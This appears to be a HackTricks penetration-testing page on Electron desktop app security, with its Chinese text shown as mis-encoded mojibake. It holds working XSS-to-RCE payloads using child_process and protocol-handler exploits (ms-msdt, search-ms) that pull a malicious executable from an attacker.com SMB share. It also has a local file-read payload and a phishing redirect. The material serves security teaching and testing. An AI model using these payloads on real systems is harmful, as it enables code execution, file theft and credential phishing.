# Electron Desktop Apps

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


## ä»‹ç»

Electron ç»“åˆäº†æœ¬åœ°åç«¯ï¼ˆä½¿ç”¨ **NodeJS**ï¼‰å’Œå‰ç«¯ï¼ˆ**Chromium**ï¼‰ï¼Œå°½ç®¡å®ƒç¼ºä¹ç°ä»£æµè§ˆå™¨çš„ä¸€äº›å®‰å…¨æœºåˆ¶ã€‚

é€šå¸¸ä½ å¯èƒ½ä¼šåœ¨ `.asar` åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ° Electron åº”ç”¨ä»£ç ï¼Œè·å–ä»£ç éœ€è¦æå–å®ƒï¼š
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
åœ¨ Electron åº”ç”¨çš„æºä»£ç ä¸­ï¼Œåœ¨ `packet.json` æ–‡ä»¶å†…ï¼Œå¯ä»¥æ‰¾åˆ°æŒ‡å®šçš„ `main.js` æ–‡ä»¶ï¼Œå…¶ä¸­è®¾ç½®äº†å®‰å…¨é…ç½®ã€‚
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron æœ‰ 2 ç§è¿›ç¨‹ç±»å‹ï¼š

* ä¸»è¿›ç¨‹ï¼ˆå®Œå…¨è®¿é—® NodeJSï¼‰
* æ¸²æŸ“è¿›ç¨‹ï¼ˆå‡ºäºå®‰å…¨åŸå› ï¼ŒNodeJS åº”è¯¥å—åˆ°é™åˆ¶è®¿é—®ï¼‰

![](<../../../.gitbook/assets/image (182).png>)

ä¸€ä¸ª **æ¸²æŸ“è¿›ç¨‹** å°†æ˜¯ä¸€ä¸ªåŠ è½½æ–‡ä»¶çš„æµè§ˆå™¨çª—å£ï¼š
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
è®¾ç½®**æ¸²æŸ“è¿›ç¨‹**å¯ä»¥åœ¨**ä¸»è¿›ç¨‹**ä¸­çš„main.jsæ–‡ä»¶ä¸­**é…ç½®**ã€‚ä¸€äº›é…ç½®å°†**é˜²æ­¢Electronåº”ç”¨ç¨‹åºè·å¾—RCE**æˆ–å…¶ä»–æ¼æ´ï¼Œå¦‚æœ**è®¾ç½®æ­£ç¡®é…ç½®**ã€‚

Electronåº”ç”¨ç¨‹åº**å¯ä»¥é€šè¿‡Node APIè®¿é—®è®¾å¤‡**ï¼Œå°½ç®¡å¯ä»¥é…ç½®ä»¥é˜²æ­¢å®ƒï¼š

* **`nodeIntegration`** - é»˜è®¤æƒ…å†µä¸‹ä¸º`off`ã€‚å¦‚æœå¼€å¯ï¼Œå…è®¸ä»æ¸²æŸ“è¿›ç¨‹è®¿é—®NodeåŠŸèƒ½ã€‚
* **`contextIsolation`** - é»˜è®¤æƒ…å†µä¸‹ä¸º`on`ã€‚å¦‚æœå…³é—­ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ä¸è¢«éš”ç¦»ã€‚
* **`preload`** - é»˜è®¤æƒ…å†µä¸‹ä¸ºç©ºã€‚
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - é»˜è®¤æƒ…å†µä¸‹ä¸ºoffã€‚å®ƒå°†é™åˆ¶NodeJSå¯ä»¥æ‰§è¡Œçš„æ“ä½œã€‚
* å·¥ä½œçº¿ç¨‹ä¸­çš„Nodeé›†æˆ
* **`nodeIntegrationInSubframes`** - é»˜è®¤æƒ…å†µä¸‹ä¸º`off`ã€‚
* å¦‚æœ**`nodeIntegration`**è¢«**å¯ç”¨**ï¼Œè¿™å°†å…è®¸åœ¨Electronåº”ç”¨ç¨‹åºä¸­**åŠ è½½åœ¨iframeä¸­çš„ç½‘é¡µ**ä½¿ç”¨**Node.js API**ã€‚
* å¦‚æœ**`nodeIntegration`**è¢«**ç¦ç”¨**ï¼Œåˆ™é¢„åŠ è½½å°†åœ¨iframeä¸­åŠ è½½ã€‚

é…ç½®ç¤ºä¾‹ï¼š
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ä¸€äº› **RCE payloads** æ¥è‡ª [è¿™é‡Œ](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### æ•è·æµé‡

ä¿®æ”¹ start-main é…ç½®å¹¶æ·»åŠ ä½¿ç”¨ä»£ç†ï¼Œä¾‹å¦‚ï¼š
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron æœ¬åœ°ä»£ç æ³¨å…¥

å¦‚æœæ‚¨å¯ä»¥æœ¬åœ°æ‰§è¡Œä¸€ä¸ª Electron åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½å¯ä»¥ä½¿å…¶æ‰§è¡Œä»»æ„çš„ JavaScript ä»£ç ã€‚è¯·æŸ¥çœ‹å¦‚ä½•æ“ä½œï¼š

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

å¦‚æœ **nodeIntegration** è®¾ç½®ä¸º **on**ï¼Œç½‘é¡µçš„ JavaScript å¯ä»¥è½»æ¾ä½¿ç”¨ Node.js åŠŸèƒ½ï¼Œåªéœ€è°ƒç”¨ `require()`ã€‚ä¾‹å¦‚ï¼Œåœ¨ Windows ä¸Šæ‰§è¡Œè®¡ç®—å™¨åº”ç”¨ç¨‹åºçš„æ–¹æ³•æ˜¯ï¼š
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

åœ¨æ­¤è®¾ç½®ä¸­æŒ‡ç¤ºçš„è„šæœ¬æ˜¯åœ¨æ¸²æŸ“å™¨ä¸­**åŠ è½½å…¶ä»–è„šæœ¬ä¹‹å‰**ï¼Œå› æ­¤å®ƒå…·æœ‰**å¯¹ Node API çš„æ— é™è®¿é—®æƒé™**ï¼š
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
å› æ­¤ï¼Œè„šæœ¬å¯ä»¥å°† node-features å¯¼å‡ºåˆ°é¡µé¢ï¼š

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**å¦‚æœ `contextIsolation` å¼€å¯ï¼Œè¿™å°†æ— æ³•å·¥ä½œ**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ å¼•å…¥äº† **ç½‘é¡µè„šæœ¬ä¸ JavaScript Electron å†…éƒ¨ä»£ç ä¹‹é—´çš„åˆ†ç¦»ä¸Šä¸‹æ–‡**ï¼Œä½¿å¾—æ¯æ®µä»£ç çš„ JavaScript æ‰§è¡Œä¸ä¼šç›¸äº’å½±å“ã€‚è¿™æ˜¯æ¶ˆé™¤ RCE å¯èƒ½æ€§çš„å¿…è¦ç‰¹æ€§ã€‚

å¦‚æœä¸Šä¸‹æ–‡æ²¡æœ‰è¢«éš”ç¦»ï¼Œæ”»å‡»è€…å¯ä»¥ï¼š

1. åœ¨æ¸²æŸ“å™¨ä¸­æ‰§è¡Œ **ä»»æ„ JavaScript**ï¼ˆXSS æˆ–å¯¼èˆªåˆ°å¤–éƒ¨ç½‘ç«™ï¼‰
2. **è¦†ç›–** åœ¨é¢„åŠ è½½æˆ– Electron å†…éƒ¨ä»£ç ä¸­ä½¿ç”¨çš„å†…ç½®æ–¹æ³•ä¸ºè‡ªå·±çš„å‡½æ•°
3. **è§¦å‘** ä½¿ç”¨ **è¢«è¦†ç›–çš„å‡½æ•°**
4. RCEï¼Ÿ

å†…ç½®æ–¹æ³•å¯ä»¥è¢«è¦†ç›–çš„åœ°æ–¹æœ‰ä¸¤ä¸ªï¼šåœ¨é¢„åŠ è½½ä»£ç ä¸­æˆ–åœ¨ Electron å†…éƒ¨ä»£ç ä¸­ï¼š

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ç»•è¿‡ç‚¹å‡»äº‹ä»¶

å¦‚æœåœ¨ç‚¹å‡»é“¾æ¥æ—¶æœ‰é™åˆ¶ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡ **ä¸­é—´ç‚¹å‡»** è€Œä¸æ˜¯å¸¸è§„çš„å·¦é”®ç‚¹å‡»æ¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

æœ‰å…³æ­¤ç¤ºä¾‹çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) å’Œ [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

åœ¨éƒ¨ç½² Electron æ¡Œé¢åº”ç”¨ç¨‹åºæ—¶ï¼Œç¡®ä¿ `nodeIntegration` å’Œ `contextIsolation` çš„æ­£ç¡®è®¾ç½®è‡³å…³é‡è¦ã€‚å·²ç¡®å®šï¼Œ**é’ˆå¯¹é¢„åŠ è½½è„šæœ¬æˆ– Electron çš„ä¸»è¿›ç¨‹æœ¬æœºä»£ç çš„å®¢æˆ·ç«¯è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)** åœ¨è¿™äº›è®¾ç½®åˆ°ä½æ—¶æœ‰æ•ˆé˜²æ­¢ã€‚

å½“ç”¨æˆ·ä¸é“¾æ¥äº¤äº’æˆ–æ‰“å¼€æ–°çª—å£æ—¶ï¼Œä¼šè§¦å‘ç‰¹å®šçš„äº‹ä»¶ç›‘å¬å™¨ï¼Œè¿™å¯¹åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’ŒåŠŸèƒ½è‡³å…³é‡è¦ï¼š
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
è¿™äº›ç›‘å¬å™¨è¢«**æ¡Œé¢åº”ç”¨ç¨‹åºé‡å†™**ä»¥å®ç°å…¶è‡ªå·±çš„**ä¸šåŠ¡é€»è¾‘**ã€‚è¯¥åº”ç”¨ç¨‹åºè¯„ä¼°å¯¼èˆªé“¾æ¥æ˜¯å¦åº”è¯¥åœ¨å†…éƒ¨æ‰“å¼€æˆ–åœ¨å¤–éƒ¨ç½‘é¡µæµè§ˆå™¨ä¸­æ‰“å¼€ã€‚è¿™ä¸ªå†³å®šé€šå¸¸é€šè¿‡ä¸€ä¸ªå‡½æ•°`openInternally`æ¥åšã€‚å¦‚æœè¿™ä¸ªå‡½æ•°è¿”å›`false`ï¼Œåˆ™è¡¨ç¤ºé“¾æ¥åº”è¯¥åœ¨å¤–éƒ¨æ‰“å¼€ï¼Œåˆ©ç”¨`shell.openExternal`å‡½æ•°ã€‚

**ä»¥ä¸‹æ˜¯ç®€åŒ–çš„ä¼ªä»£ç ï¼š**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (261).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (963).png>)

Electron JSå®‰å…¨æœ€ä½³å®è·µå»ºè®®ä¸è¦ä½¿ç”¨`openExternal`å‡½æ•°æ¥å—ä¸å—ä¿¡ä»»çš„å†…å®¹ï¼Œå› ä¸ºè¿™å¯èƒ½é€šè¿‡å„ç§åè®®å¯¼è‡´RCEã€‚æ“ä½œç³»ç»Ÿæ”¯æŒä¸åŒçš„åè®®ï¼Œè¿™äº›åè®®å¯èƒ½ä¼šè§¦å‘RCEã€‚æœ‰å…³æ­¤ä¸»é¢˜çš„è¯¦ç»†ç¤ºä¾‹å’Œè¿›ä¸€æ­¥è§£é‡Šï¼Œå¯ä»¥å‚è€ƒ[è¿™ä¸ªèµ„æº](https://positive.security/blog/url-open-rce#windows-10-19042)ï¼Œå…¶ä¸­åŒ…æ‹¬èƒ½å¤Ÿåˆ©ç”¨æ­¤æ¼æ´çš„Windowsåè®®ç¤ºä¾‹ã€‚

**Windowsåè®®åˆ©ç”¨çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## è¯»å–å†…éƒ¨æ–‡ä»¶ï¼šXSS + contextIsolation

**ç¦ç”¨ `contextIsolation` ä½¿å¾—å¯ä»¥ä½¿ç”¨ `<webview>` æ ‡ç­¾**ï¼Œç±»ä¼¼äº `<iframe>`ï¼Œç”¨äºè¯»å–å’Œæå–æœ¬åœ°æ–‡ä»¶ã€‚æä¾›çš„ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´è¯»å–å†…éƒ¨æ–‡ä»¶çš„å†…å®¹ï¼š

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf\_F2ttJg (1).png>)

æ­¤å¤–ï¼Œè¿˜åˆ†äº«äº†å¦ä¸€ç§ **è¯»å–å†…éƒ¨æ–‡ä»¶** çš„æ–¹æ³•ï¼Œå¼ºè°ƒäº† Electron æ¡Œé¢åº”ç”¨ä¸­çš„ä¸€ä¸ªå…³é”®æœ¬åœ°æ–‡ä»¶è¯»å–æ¼æ´ã€‚è¿™æ¶‰åŠæ³¨å…¥è„šæœ¬ä»¥åˆ©ç”¨è¯¥åº”ç”¨å¹¶æå–æ•°æ®ï¼š
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + æ—§ç‰ˆ Chromium**

å¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨çš„ **chromium** æ˜¯ **æ—§ç‰ˆ** å¹¶ä¸”å­˜åœ¨ **å·²çŸ¥çš„æ¼æ´**ï¼Œé‚£ä¹ˆå¯èƒ½é€šè¿‡ **XSS åˆ©ç”¨å®ƒå¹¶è·å¾— RCE**ã€‚\
æ‚¨å¯ä»¥åœ¨è¿™ä¸ª **writeup** ä¸­çœ‹åˆ°ä¸€ä¸ªä¾‹å­: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **é€šè¿‡å†…éƒ¨ URL æ­£åˆ™ç»•è¿‡è¿›è¡Œ XSS é’“é±¼**

å‡è®¾æ‚¨å‘ç°äº†ä¸€ä¸ª XSSï¼Œä½†æ‚¨ **æ— æ³•è§¦å‘ RCE æˆ–çªƒå–å†…éƒ¨æ–‡ä»¶**ï¼Œæ‚¨å¯ä»¥å°è¯•åˆ©ç”¨å®ƒæ¥ **é€šè¿‡é’“é±¼çªƒå–å‡­æ®**ã€‚

é¦–å…ˆï¼Œæ‚¨éœ€è¦äº†è§£å½“æ‚¨å°è¯•æ‰“å¼€ä¸€ä¸ªæ–° URL æ—¶ï¼Œå‰ç«¯çš„ JS ä»£ç ä¼šå‘ç”Ÿä»€ä¹ˆ:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
è°ƒç”¨ **`openInternally`** å°†å†³å®š **é“¾æ¥** æ˜¯å¦åœ¨ **æ¡Œé¢çª—å£** ä¸­ **æ‰“å¼€**ï¼Œå› ä¸ºå®ƒæ˜¯å±äºå¹³å°çš„é“¾æ¥ï¼Œ**æˆ–è€…** æ˜¯å¦åœ¨ **æµè§ˆå™¨ä¸­ä½œä¸ºç¬¬ä¸‰æ–¹èµ„æº** æ‰“å¼€ã€‚

å¦‚æœè¯¥å‡½æ•°ä½¿ç”¨çš„ **regex** **æ˜“å—ç»•è¿‡æ”»å‡»**ï¼ˆä¾‹å¦‚ **æœªè½¬ä¹‰å­åŸŸçš„ç‚¹**ï¼‰ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨ XSS **æ‰“å¼€ä¸€ä¸ªæ–°çª—å£**ï¼Œè¯¥çª—å£å°†ä½äºæ”»å‡»è€…çš„åŸºç¡€è®¾æ–½ä¸­ **è¦æ±‚ç”¨æˆ·æä¾›å‡­æ®**ï¼š
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **å·¥å…·**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) æ˜¯ä¸€ä¸ªç”¨äºè¯†åˆ«åŸºäº Electron çš„åº”ç”¨ç¨‹åºä¸­çš„é”™è¯¯é…ç½®å’Œå®‰å…¨åæ¨¡å¼çš„å·¥å…·ã€‚
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) æ˜¯ä¸€ä¸ªå¼€æºçš„ VS Code æ’ä»¶ï¼Œç”¨äº Electron åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨ Electronegativityã€‚
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) ç”¨äºæ£€æŸ¥æ˜“å—æ”»å‡»çš„ç¬¬ä¸‰æ–¹åº“
* [**Electro.ng**](https://electro.ng/): ä½ éœ€è¦è´­ä¹°å®ƒ

## å®éªŒå®¤

åœ¨ [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨æ˜“å—æ”»å‡»çš„ Electron åº”ç”¨ç¨‹åºçš„å®éªŒå®¤ã€‚

ä¸€äº›å°†å¸®åŠ©ä½ è¿›è¡Œå®éªŒå®¤çš„å‘½ä»¤ï¼š
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **å‚è€ƒæ–‡çŒ®**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* æ›´å¤šå…³äºElectronå®‰å…¨çš„ç ”ç©¶å’Œæ–‡ç« åœ¨ [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
